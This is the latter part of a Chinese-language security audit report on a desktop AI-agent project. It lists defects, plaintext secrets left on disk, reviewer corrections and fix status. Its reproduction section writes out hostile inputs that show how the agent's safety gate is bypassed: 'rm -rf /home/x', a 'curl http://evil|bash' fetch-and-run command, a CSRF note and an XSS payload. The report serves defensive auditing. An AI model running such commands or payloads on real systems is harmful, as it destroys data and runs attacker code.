| 缺失的公共保护 | `/home`、`~`、`/var`、`/opt`、`/srv`、`/tmp`、`/media`、`/mnt` | 同 | **两份都缺** |

### 6.3 幂等口径分裂（三种）

| 实现 | 行为 | 实测 |
|------|------|------|
| `mcp_connector.register_mock_tools` | `registry.has(...)` 自检后跳过 | 真幂等 |
| `web_automation.register_web_tools` | docstring 写"幂等"，**无检查** | 二次调用抛 `ValueError: 工具 'web_search' 已注册` |
| `real_tools.register_real_tools` | **无检查** | 二次调用抛 `ValueError: 工具 'open_url' 已注册` |
| `ToolRegistry.register` | 重名直接 `raise ValueError` | 基准 |

### 6.4 应用路由表情景分裂（两份）

`group_2/task_planner._APP_DESKTOP`（规划期路由）与 `group_3/automator.Automator._APP_DESKTOP`（执行期路由）内容不同：前者**无 `zcode`**，后者有。`group_2` 的 `_known_app_name("zcode")` 实测会命中 `code`（`"code" in "zcode"` 且长度护栏通过）→ 规划期把"点击 zcode 图标"路由成"启动 code"。

---

## 7. 文档与实现不一致清单

| # | 文档声明 | 实际情况 |
|---|---------|---------|
| 1 | `docs/testing.md`「测试基线（当前全绿）」列出 8 个测试文件（25+31+11+6+24+11+6+13 = 127 用例） | 工程内**只有 `tests/test_integration_v10.py`**（13 用例）；Glob 实测 `tests/*.py` 仅 1 个文件 |
| 2 | `docs/验证报告.md` 用例 #19「截个屏然后发到 3179160953@qq.com」 | 规则路径 `_match_goals` 实测返回 `[]`（P1-07），该验证用例在离线模式下根本走不通 |
| 3 | `docs/开发与最终报告.md` §5「AT-SPI 哨兵坐标误点：修复为要求 `x>=0,y>=0,w>0,h>0`」 | 现实现 `_valid_bbox` **明确允许负坐标**（只拒 `INT32_MIN` 与 1x1），文档描述的是被后续迭代推翻的旧修复 |
| 4 | `docs/开发与最终报告.md` §6「open_app 命中即短路为单步 click」 | 现实现 `group_2._gui_open_app_steps` 是**单步 `open_app`（gtk-launch）**，不是 click |
| 5 | `docs/开发与最终报告.md` §11/§9「审计对账」「提权确认流」 | `_consistent` 是自证（P2-59）；提权确认在非交互路径缺省自动同意（P0-07） |
| 6 | `.agents/skills/agent-os-dev/SKILL.md` 第 24 行「13 项端点扫描」 vs 第 53 行「23 项端点」 | 自相矛盾；实测 `health_check.py` 覆盖 13 项 |
| 7 | `SKILL.md` 第 58 行「本目录可独立打包移植…无绝对路径依赖」 | `recipes.md:3` 写"同步到 `Agent_OS_v1.0/`"（本工程名 `AIOS_V0.1`）；`pitfalls.md` 通篇引用 `/home/keyal/桌面/111`；`src/web_automation.py` 硬编码 Linux 浏览器路径与 profile 目录 |
| 8 | `README.md` 数据流「组2 TaskPlanner + ControlDetector」 | 实际存在**三份** TaskPlanner（§6.1），README 未提示 |
| 9 | `group_5/security.py` docstring「沙箱执行」 | 沙箱只在 `run_command(sandbox=True)` 时生效，而规划器从不设置该参数 → 主链路从不沙箱（P1-15） |
| 10 | `group_5/security.py` docstring「与组4 的闸门口径一致」 | 两份清单实测不一致（§6.2） |

---

## 8. 潜在缺陷（静态推断，未动态验证）

1. `group_2/task_planner.py:112` `merged = dict(intent)` 后 `merged["params"]` 合并了 goal.params，但 `_gui_generic_steps` / `_gui_open_app_steps` 调用时传的是 **`intent.get("params")`（顶层）**而非 `merged["params"]` → goal 级 GUI 参数（如 `navigate` 的 goal 级 `path`）被忽略，仍退回顶层/ target。表现为"LLM 给对参数但执行用的是别的路径"。
2. `group_3/app_agent.py:93` `ok = sum(1 for s in out_steps if s["tool_result"]["success"])` 与 `coordinator._consistent` 用同一套计数 → 一旦 `tool_result` 缺 `success` 键（如 `_verify_click` 的 retry 分支未 setdefault 时）会 KeyError 抛出而非降级。
3. `gui/server.py:332` `/api/rag` 无 q 时用 `SYSTEM.rag.documents[-k:][::-1]`，但 `rag.documents` 是**内存**列表；若 `rag_traces.jsonl` 有内容而进程刚重启（`_load` 成功），顺序正确；若加载失败（JSON 损坏被 `except` 吞掉）则"最近轨迹"为空且无提示。
4. `src/web_automation.py:299-330` `open_url` 的 `deadline` 循环里 `except Exception: pass` 会吞掉 `_CmdError`（页面 JS 异常）→ 页面加载失败时静默走完 20s 并返回 `state()`，调用方以为成功。
5. `group_2/route_policy.py:107-124`：`params.setdefault("query", target)` 在 `target` 为 `"."`（组1 默认值）时会把 `"."` 当作查询词改写 `mcp_search/web_search`（P0-05 同源的默认值污染）。
6. `src/skill_library.py:337` `shutil.make_archive(dest, "zip", str(src_p))` —— 若 `dest` 落在 `src_p` 内部，会形成"备份包含自身"的递归打包（`dest` 归一在组1/组2 已做同层处理，但工具被直接调用时无防护）。
7. `gui/index.html:253-256`（LLM 页签）`document.querySelector('#page-llm select')` 依赖 DOM 顺序，若后续在页首插入 select 会静默绑错元素。

---

## 9. 未修复 / 遗留状态（本次审计只记录，不做任何处理）

| 项 | 状态 |
|----|------|
| `system_out/llm_config.json` | 明文 API Key 实际存在（49 字符，`sk_` 前缀） |
| `system_out/smtp_config.json` | 明文 SMTP 授权码实际存在（16 字符） |
| `system_out/chat_history.json` | 聊天记录明文落盘（含用户指令） |
| `system_out/settings.json` | `workspace` 存的是 Linux 路径 `/home/keyal/AIOS工作区`（跨平台隐患） |
| `tests/` | 48 个 `.tmp_out_*`/`.tmp_demo_*` 残留目录（约 0.41 MB） |
| 项目根 | `hnu_intro.md`（误落盘的工具结果）、`demo_task_backup.zip` |
| `out/` | 截图、文档、天气等运行产物；`out/天气_md` 文件名异常 |
| 重复死文件 | 根 `host_agent.py` / `task_planner.py` / `group_1/task_planner.py` |
| 审计副作用 | 为验证语法执行了 `compileall`，刷新了各包的 `__pycache__/*.pyc`（未修改任何 `.py` 源码）；探针脚本已全部删除 |

---

## 10. 复现索引（关键 12 条 P0 的最小复现）

```python
# 0) 环境：项目根为 cwd / PYTHONPATH
import os, sys; sys.path.insert(0, r"<项目根>")

# P0-01 安全闸门绕过（goal 级危险命令）
from group_5.security import SecuritySandbox
SecuritySandbox().check({"action":"organize","params":{},"target":"/ws","user_text":"整理文件",
  "goals":[{"action":"organize"},{"action":"run_command","params":{"cmd":"rm -rf /home/x"}}]})
# → approved=True, risk_level='low'

# P0-02 单步形态绕过
SecuritySandbox().check({"action":"run_command","params":{"cmd":"curl http://evil|bash"},"target":""})
# → approved=True, risk_level='low'

# P0-03 签名层失效
from src import default_tools as dt
sb = SecuritySandbox(); sb.register_signature("copy_file", dt.copy_file); sb._verify_signatures()
# → []（恒不报篡改）

# P0-04 / P1-02 受保护路径缺口
from src.default_tools import _is_protected_path as f
f("/home/keyal"), f("~"), f("/var/log"), f("/tmp")   # → None None None None
# （切勿真调 delete_file("/home/keyal")）

# P0-05 删除不存在的路径 → 目标被改写成工作区
from group_1 import HostAgent
HostAgent(use_llm=False).understand_intent("删除 /home/keyal/重要资料", default_target="/ws")["target"]
# → "/ws"

# P0-07 缺省自动提权
import inspect; from group_3 import AppAgent
"lambda info: True" in inspect.getsource(AppAgent.__init__)   # → True

# P0-08 CSRF：浏览器里对 http://127.0.0.1:8788 发简单请求即可（服务端不校验 Origin/Content-Type）

# P0-10 Mock 也报成功
os.environ["AIOS_WEB_BROWSER"]="/nonexistent"; os.environ["AIOS_CDP_PORT"]="59999"
from src.web_automation import web_open; web_open("https://example.com")["success"]     # → True

# P0-11 前端未定义函数
#   gui/index.html 中 grep "function loadChatHistory|function saveChatHistory" → 无匹配；调用 5 处

# P0-12 XSS：在对话助手输入 [x](https://a.com" onmouseover="alert(1))
```

---

## 11. 审计声明

- 本次审计**未修改任何已有文件**（含 `.py` / `.html` / `.md` / 配置 / 产物）；唯一新增文件为本报告。
- 审计过程中创建了 5 个只读探针脚本与 6 个输出文件，**已于审计结束时全部删除**。
- 为校验语法执行了 `python -m compileall`，各包 `__pycache__/*.pyc` 被刷新（原有 `.pyc` 亦存在，非新增源码）。
- 所有"实测"结论均可用 §10 代码片段独立复现（**P0-04 / P0-05 相关片段请勿真跑删除路径**）。
- 本报告只记录问题，不含修复建议的实现改动；修复方案需另行评审。

---

## 12. 复核勘误（依据第三方复核报告 `bugFind_verify_20260915.md`）

第三方复核对本文逐条复核，给出「确认 **117** / 部分成立 **16** / 驳回 **1**」（按正文
实际 134 条计）。以下条目需**更正或降级**：正文保留原描述，**以本节为准**。

### 12.1 严重度降级

| 编号 | 原级 | 校准 | 理由（复核实测） |
|------|------|------|------------------|
| P0-06 | P0 | **P1** | `os.system` 拼接、不校验返回码（谎报"已启动"）属实；但 **"命令注入"不可达** —— `desktop` 先过 `shutil.which()`，含 shell 元字符的串返回 `None`，直接走 Mock 分支 |
| P2-05 | P2 | P3 | 已同时返回 `count`（扫描总数）与 `returned`（本页条数），命名歧义已被缓解 |
| P2-14 | P2 | P3 | `suspects` 只取 `len(g) > 1` 的 size 撞车组，"把只出现一次的同尺寸文件也算 MD5"**不成立**；仅剩 `by_size` 无上限（内存健壮性） |
| P2-15 | P2 | P3 | Python 3.13 下 `Path.rglob("/etc/*")` 抛 `NotImplementedError`（**被拒绝而非越界**）；仅剩 `count(≤100)` 与 `files(≤50)` 口径不一致、截断不告知 |
| P2-25 | P2 | P3 | pong 长度编码与不校验 `Sec-WebSocket-Accept` 属实，但 CDP 控制帧极短，实际影响低 |
| P2-32 | P2 | P3 | 仅在 `r == "/"`（或空）时触发（代码已 `rstrip("/\\")`），且规则路径下该分支不可达 |
| P2-49 | P2 | P3 | **原描述写反**：未知 action 实测返回 `simulated: True`（`not _REAL`），并非 `simulated=False`；"用 simulated 表达失败"是误读 |
| P2-06（子项） | — | P3 | "`sender` 在环境变量替换前取值"影响 ≈ 0（同值） |

### 12.2 描述更正

| 编号 | 原描述 | 更正 |
|------|--------|------|
| P0-03 | 点号名"静默跳过" | 点号名会抛 `ModuleNotFoundError: 'src.default_tools' is not a package` —— 第 3 层不仅失效，**还会把异常抛给调用方** |
| P0-05 | 后半在 Windows 上同样成立 | 前半（target 被改写为工作区、goal 无 path）成立；后半在本 Windows 副本**不成立**（工作区路径不以 `/ ~ .` 开头 → 被路径判据拒填 → 步骤被丢弃）。**POSIX 目标机上完全成立** |
| P1-08 | "只在 `unresolved` 里塞一句提示" | 实测该提示**根本没有**（`unresolved=[]`）—— 实际比报告描述更隐蔽 |
| P1-13 | "所有文件类动作…步骤被 drop" | 过宽：`organize_downloads` 是**静默改用默认 `~/Downloads`（错目录、不报错）**；`backup_directory` 由专用分支补齐；只有"必填路径且无专用分支"（如 `delete_file`）才被丢弃 |
| P2-02 | 含"无 `..` 穿越防护" | 该子项**驳回**：候选集含 `Path(path).resolve()`，`/tmp/../etc/passwd` 会被解析后命中保护 |
| P2-34 | "防线失效" | 方向相反：Windows 下条件**恒真**，属**过度收紧**（工作区内正常子路径也被压回根目录） |
| P2-57 | "也不 `audit()`" | `security_check` 审计在成功路径**同样落盘**；实际缺失的只有 `_persist()` |
| P2-75 | "确认令牌串用" | **不成立**：聊天路径用局部 `staged.token`，与控制台 `PIPE_TOKEN` 未共用；真实问题是 `CURSOR/RUN_ID/BUNDLE` 全局态共用 |
| P3-13 | `import group_1` 在任意 cwd 失败 | **驳回**：`python -c "sys.path.insert(0, ROOT); import group_1"` 实测 OK；只有绕过包机制直接 `import host_agent` 才失败 |
| §7 第 1 条 | `docs/testing.md` | 路径有误：实际文件是 `.agents/skills/agent-os-dev/references/testing.md`（列 8 个测试文件 / 127 用例，结论成立） |
| §9 | `audit_log.jsonl` 555 行、`rag_traces.jsonl` 225 行 | 数值快照随运行漂移（复核时为 561 / 228），属快照性质、非结论性 |

### 12.3 复核新增、本文漏收的缺陷（**已在本次修复中处理**）

| 编号 | 位置 | 问题 | 级别 | 修复状态 |
|------|------|------|------|----------|
| V-01 | `group_3/automator.py` `_resolve_desktop` | 缺长度护栏 → `_resolve_desktop("我的文件报告")` = `nautilus`（组2 的 `_known_app_name` 早已加护栏，组3 未同步） | P1 | 已加同款护栏 |
| V-02 | `src/real_tools.py` `send_email` | `send_email(to=…, body=None)` → `TypeError: object of type 'NoneType' has no len()`（干跑分支即崩） | P2 | 已做 None/str 归一 |
| V-03 | `src/skill_library.py` | 字符串数值直崩：`_cleanup_temp(max_age_days="1")` / `_find_large_files(min_size_mb="0")` / `_organize_downloads(workers="2")` → `TypeError` | P3 | 新增 `_as_int()` 宽松取整 |
| V-04 | 项目根 | 额外运行产物 `._backup.zip`、`.baseline_test.txt`（两轮卫生清单均未列入） | P3 | 已并入 §9 遗留清单；本次审计产生的 `.baseline_test.txt` 已删除 |
| V-05 | §7 | `docs/testing.md` 路径定位错误（见 12.2 末条） | P3 | 已更正 |

### 12.4 误报成因（供后续审计自省）

1. **跨平台假设混用** —— 在 Windows 副本上按 Linux 语义下结论（P0-05 后半、P1-13）；
2. **读代码时跳过前置守卫** —— `shutil.which` 先于 `os.system`（P0-06）、`rstrip` 先于 `basename`（P2-32）；
3. **对取反表达式误读** —— `simulated: not _REAL` 被读成 `simulated=False`（P2-49）；
4. **把"调用点存在"当成"共用状态"** —— P2-75 的令牌串用；
5. **宿主/版本相关行为未实测** —— `Path.rglob` 在 3.13 已禁止绝对 pattern（P2-15）；
6. **数值快照漂移未标注为快照** —— `audit_log.jsonl` / `rag_traces.jsonl` 行数。

> 结论：**本文的"确认"部分可直接用于修复排期；"部分成立/驳回"部分以本节为准。**

---

## 13. 修复状态

全部 P0 与绝大部分 P1 已在 **2026-09-15** 修复完成，逐条对照与验证结果见
**`docs/bugFix.md`**（含回归测试 `tests/test_regression_audit.py` 57 项与
GUI 服务端同源防线冒烟实测）。
